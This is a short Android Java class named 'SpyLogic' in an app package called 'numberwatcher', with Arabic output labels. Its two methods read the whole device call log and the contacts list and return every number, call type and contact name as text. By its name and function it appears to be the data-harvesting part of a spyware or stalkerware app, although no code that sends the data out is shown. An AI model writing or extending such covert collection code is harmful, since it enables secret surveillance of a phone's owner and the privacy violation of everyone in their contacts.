package com.example.numberwatcher;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;

public class SpyLogic {

    public static String getCallLog(Context context) {
        StringBuilder callLog = new StringBuilder();
        Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                callLog.append("رقم: ").append(number).append(" | النوع: ").append(type).append("\n");
            }
            cursor.close();
        }
        return callLog.toString();
    }

    public static String getContacts(Context context) {
        StringBuilder contacts = new StringBuilder();
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                contacts.append("الاسم: ").append(name).append(" | الرقم: ").append(number).append("\n");
            }
            cursor.close();
        }
        return contacts.toString();
    }
}
